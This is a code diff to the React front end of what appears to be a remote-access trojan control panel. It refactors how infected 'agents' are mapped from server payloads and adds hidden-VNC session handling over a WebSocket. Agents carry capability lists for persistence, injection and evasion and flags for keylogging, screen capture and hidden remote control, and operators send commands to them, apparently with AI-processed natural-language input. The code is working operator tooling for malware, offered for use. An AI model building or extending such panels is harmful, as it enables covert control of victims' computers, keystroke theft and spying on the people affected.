@@ -2,6 +2,7 @@ import { useState, useEffect, useRef } from 'react';
 import { Toaster } from 'react-hot-toast';
 import { ThemeProvider } from './contexts/ThemeContext';
 import { NotificationProvider } from './contexts/NotificationContext';
+import { HvncProvider, useHvnc } from './contexts/HvncContext';
 import DashboardPage from './pages/DashboardPage';
 import ThemeLoginPage from './components/ThemeLoginPage';
 import TransferModal from './TransferModal';
@@ -14,7 +15,92 @@ import { TerminalRef } from './components/Terminal';
 import { WS_URL } from './config';
 import request from './axios';
 
-export default function App() {
+const normalizeFeatureKey = (value: unknown): string => {
+  if (typeof value !== 'string') {
+    return '';
+  }
+  return value.toLowerCase().replace(/[\s_-]/g, '');
+};
+
+const deriveFeatureFlags = (payload: any): Agent['features'] => {
+  const capabilityFeatures = Array.isArray(payload?.capabilities?.features)
+    ? payload.capabilities.features
+    : [];
+  const arrayFeatures = Array.isArray(payload?.features) ? payload.features : [];
+  const rawFeatureFlags =
+    payload?.features && typeof payload.features === 'object' && !Array.isArray(payload.features)
+      ? payload.features
+      : {};
+
+  const featureSet = new Set<string>();
+  [...capabilityFeatures, ...arrayFeatures].forEach((feature) => {
+    const normalized = normalizeFeatureKey(feature);
+    if (normalized) {
+      featureSet.add(normalized);
+    }
+  });
+
+  const hasFeature = (key: string, ...aliases: string[]) => {
+    if (rawFeatureFlags && typeof rawFeatureFlags === 'object' && rawFeatureFlags[key] === true) {
+      return true;
+    }
+    if (payload?.[key] === true) {
+      return true;
+    }
+    const normalizedKey = normalizeFeatureKey(key);
+    if (featureSet.has(normalizedKey)) {
+      return true;
+    }
+    return aliases.some((alias) => featureSet.has(normalizeFeatureKey(alias)));
+  };
+
+  return {
+    hvnc: hasFeature('hvnc', 'remotecontrol', 'hiddenvnc'),
+    keylogger: hasFeature('keylogger', 'keylog'),
+    screenCapture: hasFeature('screenCapture', 'screencapture', 'screencap', 'screenshot'),
+    fileManager: hasFeature('fileManager', 'filemanager', 'filebrowser'),
+    processManager: hasFeature('processManager', 'processmanager', 'taskmanager'),
+  };
+};
+
+const mapPayloadToAgent = (payload: any): Agent => {
+  const capabilities = payload?.capabilities || {};
+  const featureFlags = deriveFeatureFlags(payload);
+
+  return {
+    _id: payload?._id,
+    id: payload?.uuid || payload?.id || payload?.agentId || '',
+    name: payload?.computerName || payload?.name || 'Unknown',
+    computerName: payload?.computerName || 'Unknown',
+    hostname: payload?.hostname,
+    ip: payload?.ipAddress || payload?.ip || 'Unknown',
+    ipAddress: payload?.ipAddress || payload?.ip || 'Unknown',
+    platform: payload?.platform || payload?.operatingSystem || 'unknown',
+    operatingSystem: payload?.operatingSystem || payload?.platform || 'unknown',
+    osVersion: payload?.osVersion || 'Unknown',
+    architecture: payload?.architecture || 'unknown',
+    status: payload?.status || 'offline',
+    lastSeen: payload?.lastSeen || payload?.lastActiveTime || new Date().toISOString(),
+    lastActiveTime: payload?.lastActiveTime || payload?.lastSeen || new Date().toISOString(),
+    lastHeartbeat: payload?.lastHeartbeat,
+    connectionCount: payload?.connectionCount || 0,
+    version: payload?.version || '1.0.0',
+    country: payload?.country || 'Unknown',
+    capabilities: {
+      persistence: capabilities?.persistence || [],
+      injection: capabilities?.injection || [],
+      evasion: capabilities?.evasion || [],
+      commands: capabilities?.commands || [],
+      features: capabilities?.features || [],
+    },
+    features: featureFlags,
+    geoLocation: payload?.geoLocation,
+    systemInfo: payload?.systemInfo,
+  };
+};
+
+function AppShell() {
+  const { handleSocketEvent: handleHvncSocketEvent, registerTransport } = useHvnc();
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [tableData, setTableData] = useState<Agent[]>([]);
   const [isLoading, setIsLoading] = useState(true);
@@ -124,7 +210,7 @@ export default function App() {
     }
   };
 
-  const initWebSocket = () => {
+    const initWebSocket = () => {
     const token = localStorage.getItem('accessToken') || '';
     console.log('[FRONTEND WS] Initializing WebSocket with token:', token);
     console.log('[FRONTEND WS] WebSocket URL:', WS_URL);
@@ -137,7 +223,13 @@ export default function App() {
       // DEBUG: Log all message types to see what we're receiving
       console.log('[FRONTEND WS] DEBUG - All message types received:', data.type);
       
-      // Handle command responses with correlationId
+        // Handle HVNC events first so UI stays in sync
+        if (data.type === 'hvnc_response' || data.type === 'hvnc_frame') {
+          handleHvncSocketEvent(data);
+          return;
+        }
+
+        // Handle command responses with correlationId
       if (data.type === 'output' && data.correlationId) {
         console.log('[FRONTEND WS] Command output received:', data.correlationId, 'Output:', data.output);
         console.log('[FRONTEND WS] Terminal ref available:', !!terminalRef.current);
@@ -185,7 +277,7 @@ export default function App() {
       
       // Handle command sent confirmation
       if (data.type === 'command_sent' && data.taskId && data.correlationId) {
-        console.log('Command sent confirmation:', data.taskId, 'CorrelationId:', data.correlationId);
+          console.log('Command sent confirmation:', data.taskId, 'CorrelationId:', data.correlationId);
         
         // Update natural language command history with AI response
         if (data.aiProcessed) {
@@ -222,7 +314,7 @@ export default function App() {
       
       // Handle task created confirmation
       if (data.type === 'task_created' && data.taskId && data.correlationId) {
-        console.log('Task created confirmation:', data.taskId, 'CorrelationId:', data.correlationId, 'Status:', data.status);
+          console.log('Task created confirmation:', data.taskId, 'CorrelationId:', data.correlationId, 'Status:', data.status);
         // Task was created successfully, we can show a loading state or just log it
         return;
       }
@@ -234,63 +326,31 @@ export default function App() {
             if (clients.length === 1) {
               // Single client update - convert Client to Agent format
               console.log('Single client update:', clients[0]);
-              setTableData(prevData => {
-                const clientData = clients[0];
-                const agentData: Agent = {
-                  _id: clientData._id,
-                  id: clientData.uuid || clientData.id,
-                  name: clientData.computerName || clientData.name || 'Unknown',
-                  computerName: clientData.computerName || 'Unknown',
-                  hostname: clientData.hostname,
-                  ip: clientData.ipAddress || clientData.ip || 'Unknown',
-                  ipAddress: clientData.ipAddress || clientData.ip || 'Unknown',
-                  platform: clientData.platform || 'unknown',
-                  operatingSystem: clientData.operatingSystem || clientData.platform || 'unknown',
-                  osVersion: clientData.osVersion || 'Unknown',
-                  architecture: clientData.architecture || 'unknown',
-                  status: clientData.status || 'offline',
-                  lastSeen: clientData.lastSeen || clientData.lastActiveTime || new Date().toISOString(),
-                  lastActiveTime: clientData.lastActiveTime || new Date().toISOString(),
-                  lastHeartbeat: clientData.lastHeartbeat,
-                  connectionCount: clientData.connectionCount || 0,
-                  version: clientData.version || '1.0.0',
-                  country: clientData.country || 'Unknown',
-                  capabilities: clientData.capabilities || {
-                    persistence: [],
-                    injection: [],
-                    evasion: [],
-                    commands: [],
-                    features: []
-                  },
-                  features: {
-                    hvnc: false,
-                    keylogger: false,
-                    screenCapture: false,
-                    fileManager: false,
-                    processManager: false
-                  },
-                  geoLocation: clientData.geoLocation,
-                  systemInfo: clientData.systemInfo
-                };
-                
-                // Find existing client by computerName and IP (not just UUID)
-                const existingClientIndex = prevData.findIndex(agent => 
-                  agent.computerName === agentData.computerName && 
-                  agent.ipAddress === agentData.ipAddress
-                );
-                
-                let updatedData;
-                if (existingClientIndex !== -1) {
-                  // Replace existing client (client reconnected with new UUID)
-                  console.log(`Replacing existing client ${prevData[existingClientIndex].id} with new UUID ${agentData.id}`);
-                  updatedData = [...prevData];
-                  updatedData[existingClientIndex] = agentData;
-                } else {
-                  // Add new client
-                  updatedData = [...prevData, agentData];
-                }
-                return updatedData;
-              });
+                setTableData((prevData) => {
+                  const clientData = clients[0];
+                  const agentData = mapPayloadToAgent(clientData);
+
+                  // Find existing client by computerName and IP (not just UUID)
+                  const existingClientIndex = prevData.findIndex(
+                    (agent) =>
+                      agent.computerName === agentData.computerName &&
+                      agent.ipAddress === agentData.ipAddress
+                  );
+
+                  let updatedData;
+                  if (existingClientIndex !== -1) {
+                    // Replace existing client (client reconnected with new UUID)
+                    console.log(
+                      `Replacing existing client ${prevData[existingClientIndex].id} with new UUID ${agentData.id}`
+                    );
+                    updatedData = [...prevData];
+                    updatedData[existingClientIndex] = agentData;
+                  } else {
+                    // Add new client
+                    updatedData = [...prevData, agentData];
+                  }
+                  return updatedData;
+                });
               toast.success(`Client ${clients[0].computerName || clients[0].name} is now ${clients[0].status}`);
             } else {
               // Full client list update - convert all clients to agents
@@ -311,46 +371,20 @@ export default function App() {
                 return acc;
               }, new Map());
               
-              const agentList: Agent[] = Array.from(uniqueClients.values()).map((clientData: any) => {
-                const agentId = clientData.uuid;
-                console.log('Mapping client:', clientData.computerName, 'uuid:', clientData.uuid, 'id:', clientData.id, 'final agentId:', agentId);
-                return {
-                _id: clientData._id,
-                id: agentId,
-                name: clientData.computerName || clientData.name || 'Unknown',
-                computerName: clientData.computerName || 'Unknown',
-                hostname: clientData.hostname,
-                ip: clientData.ipAddress || clientData.ip || 'Unknown',
-                ipAddress: clientData.ipAddress || clientData.ip || 'Unknown',
-                platform: clientData.platform || 'unknown',
-                operatingSystem: clientData.operatingSystem || clientData.platform || 'unknown',
-                osVersion: clientData.osVersion || 'Unknown',
-                architecture: clientData.architecture || 'unknown',
-                status: clientData.status || 'offline',
-                lastSeen: clientData.lastSeen || clientData.lastActiveTime || new Date().toISOString(),
-                lastActiveTime: clientData.lastActiveTime || new Date().toISOString(),
-                lastHeartbeat: clientData.lastHeartbeat,
-                connectionCount: clientData.connectionCount || 0,
-                version: clientData.version || '1.0.0',
-                country: clientData.country || 'Unknown',
-                capabilities: clientData.capabilities || {
-                  persistence: [],
-                  injection: [],
-                  evasion: [],
-                  commands: [],
-                  features: []
-                },
-                features: {
-                  hvnc: false,
-                  keylogger: false,
-                  screenCapture: false,
-                  fileManager: false,
-                  processManager: false
-                },
-                geoLocation: (clientData as any).geoLocation,
-                systemInfo: (clientData as any).systemInfo
-              };
-              });
+                const agentList: Agent[] = Array.from(uniqueClients.values()).map((clientData: any) => {
+                  const agent = mapPayloadToAgent(clientData);
+                  console.log(
+                    'Mapping client:',
+                    clientData.computerName,
+                    'uuid:',
+                    clientData.uuid,
+                    'id:',
+                    clientData.id,
+                    'final agentId:',
+                    agent.id
+                  );
+                  return agent;
+                });
               console.log('Setting table data with', agentList.length, 'agents (deduplicated from', clients.length, 'clients)');
               setTableData(agentList);
             }
@@ -364,7 +398,14 @@ export default function App() {
       });
     };
     
-    wsRef.current = wsIntegration.createConnection(token, handleMessage);
+      wsRef.current = wsIntegration.createConnection(token, handleMessage);
+      registerTransport((payload) => {
+        if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
+          wsRef.current.send(JSON.stringify(payload));
+        } else {
+          console.warn('[HVNC] Attempted to send HVNC command while WebSocket not ready');
+        }
+      });
     console.log('[FRONTEND WS] WebSocket connection created:', wsRef.current);
     
     // Add connection event listeners for debugging
@@ -377,15 +418,16 @@ export default function App() {
       });
       
       wsRef.current.addEventListener('message', (event) => {
-        console.log('[FRONTEND WS] Raw WebSocket message received:', event.data);
+          console.log('[FRONTEND WS] Raw WebSocket message received:', event.data);
       });
       
-      wsRef.current.addEventListener('close', (event) => {
+        wsRef.current.addEventListener('close', (event) => {
         console.log('[FRONTEND WS] WebSocket connection closed:', event.code, event.reason);
         setWsConnectionStatus('disconnected');
+          registerTransport(null);
       });
       
-      wsRef.current.addEventListener('error', (error) => {
+        wsRef.current.addEventListener('error', (error) => {
         console.error('[FRONTEND WS] WebSocket error:', error);
         setWsConnectionStatus('error');
       });
@@ -398,10 +440,11 @@ export default function App() {
       console.log('Fetching client list from API...');
       const agents = await agentService.getAgents();
       console.log('API returned agents:', agents);
-      if (agents) {
-        setTableData(agents);
-        console.log('Set table data with', agents.length, 'agents from API');
-      } else {
+        if (agents) {
+          const normalizedAgents = agents.map(mapPayloadToAgent);
+          setTableData(normalizedAgents);
+          console.log('Set table data with', normalizedAgents.length, 'agents from API');
+        } else {
         setTableData([]);
         console.log('No agents data returned from server');
         toast.error('No agents data returned from server.');
@@ -476,6 +519,11 @@ export default function App() {
     localStorage.removeItem('isAuthenticated');
     localStorage.removeItem('accessToken');
     setIsAuthenticated(false);
+    if (wsRef.current) {
+      wsRef.current.close();
+      wsRef.current = null;
+    }
+    registerTransport(null);
   };
 
   useEffect(() => {
@@ -488,53 +536,57 @@ export default function App() {
   // Show loading screen while checking authentication
   if (isLoading) {
     return (
-      <ThemeProvider>
-        <div className="min-h-screen bg-gray-900 flex items-center justify-center">
-          <div className="text-white text-xl">Loading...</div>
-        </div>
-      </ThemeProvider>
+      <div className="min-h-screen bg-gray-900 flex items-center justify-center">
+        <div className="text-white text-xl">Loading...</div>
+      </div>
     );
   }
 
   if (!isAuthenticated) {
-    return (
-      <ThemeProvider>
-        <ThemeLoginPage onLogin={() => setIsAuthenticated(true)} />
-      </ThemeProvider>
-    );
+    return <ThemeLoginPage onLogin={() => setIsAuthenticated(true)} />;
   }
 
   return (
+    <>
+      <Toaster position="top-right" />
+      {selectedUser && (
+        <TransferModal
+          isOpen={modalStatus}
+          setIsOpen={setModalStatus}
+          handleProcess={handleProcess}
+          user={selectedUser}
+        />
+      )}
+      {selectedUser && (
+        <TasksModal
+          isOpen={tasksModalStatus}
+          setIsOpen={setTasksModalStatus}
+          user={selectedUser}
+        />
+      )}
+      <DashboardPage
+        tableData={tableData}
+        isLoading={isLoading}
+        onActionClicked={handleActionClicked}
+        onTasksClicked={handleTasksClicked}
+        onLogout={handleLogout}
+        onSendCommand={handleSendCommand}
+        onRegisterPending={handleRegisterPending}
+        naturalLanguageHistory={naturalLanguageHistory}
+        setNaturalLanguageHistory={setNaturalLanguageHistory}
+      />
+    </>
+  );
+}
+
+export default function App() {
+  return (
     <ThemeProvider>
       <NotificationProvider>
-        <Toaster position="top-right" />
-        {selectedUser && (
-          <TransferModal
-            isOpen={modalStatus}
-            setIsOpen={setModalStatus}
-            handleProcess={handleProcess}
-            user={selectedUser}
-          />
-        )}
-        {selectedUser && (
-          <TasksModal
-            isOpen={tasksModalStatus}
-            setIsOpen={setTasksModalStatus}
-            user={selectedUser}
-          />
-        )}
-        <DashboardPage
-          tableData={tableData}
-          isLoading={isLoading}
-          onActionClicked={handleActionClicked}
-          onTasksClicked={handleTasksClicked}
-          onLogout={handleLogout}
-          onSendCommand={handleSendCommand}
-          onRegisterPending={handleRegisterPending}
-          naturalLanguageHistory={naturalLanguageHistory}
-          setNaturalLanguageHistory={setNaturalLanguageHistory}
-        />
+        <HvncProvider>
+          <AppShell />
+        </HvncProvider>
       </NotificationProvider>
     </ThemeProvider>
-   );
+  );
 }
